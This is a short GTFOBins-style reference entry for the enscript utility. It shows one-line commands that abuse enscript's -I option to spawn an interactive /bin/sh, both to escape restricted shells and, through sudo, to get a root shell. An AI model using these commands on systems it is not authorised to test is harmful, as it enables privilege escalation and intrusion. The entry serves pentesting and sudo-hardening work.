# GTFOBin: enscript

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'
```